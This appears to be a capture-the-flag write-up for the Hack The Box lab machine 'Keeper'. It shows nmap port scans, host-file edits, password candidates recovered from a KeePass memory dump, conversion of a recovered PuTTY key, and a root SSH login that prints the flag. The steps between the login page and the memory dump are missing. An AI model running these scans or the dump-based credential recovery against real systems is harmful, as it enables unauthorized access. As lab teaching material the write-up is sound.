# Keeper

First, let's scan the ip for finding out open ports
```
sudo nmap -sS --min-rate 5000 --open -Pn -n -vvv -p- 10.10.11.227 -oG allPorts
```
> Store this output information in a file named [*allPorts*](./nmap/allPorts), it's a good practice !


The scanning output shows that there's 2 open ports : `22` and `80`. Let's get more details
```
nmap -sC -sV -p20,80 10.10.11.227 -oN targeted
```
> Same, we save this information in a file named [*targeted*](./nmap/targeted) !


In the ouptut a domain name appeared : `keeper.htb`, let's add it to the `/etc/hosts`
```
10.10.11.227    keeper.htb
```

The SSH version is greater than `7.9`, so it's not (for now) vulnerable... let's check the web page (port 80)
```
whatweb http://keeper.htb
```

The output does not show something interessting... Checking the website there's a link to a subdomain : `tickets.keeper.htb` ! Let's add it to the `/etc/hosts`
```
10.10.11.227    keeper.htb      tickets.keeper.htb
```

Checking the website, we find a login page ! 









```
2024-02-05 20:18:53,849 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

We can a text like: `XXdgrXd med flXde`
> X : a letter that is unknow for now

Let's google this and we find this
```
Rødgrød med flød
```

```
puttygen ssh_key.txt -O private-openssh -o htb.pem

[21:00:15 05/02] napoknot21@qwerty [.../machines/Keeper/content] on  main [?⇡]
❯ ls
󰌆 htb.pem   KeePassDumpFull.dmp   passcodes.kdbx   passwd   RT30000.zip   ssh_key.txt

[21:00:17 05/02] napoknot21@qwerty [.../machines/Keeper/content] on  main [?⇡]
❯ chmod 600 htb.pem
error: Error when renaming history file: Invalid cross-device link

[21:00:26 05/02] napoknot21@qwerty [.../machines/Keeper/content] on  main [?⇡]
❯ ssh -i htb.pem root@10.10.11.227
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Mon Feb  5 20:53:48 2024 from 10.10.14.226
root@keeper:~# ls
root.txt  RT30000.zip  SQL
root@keeper:~# cat root.txt
79a9eca29f5c989738b5072058be1e19
root@keeper:~#
```

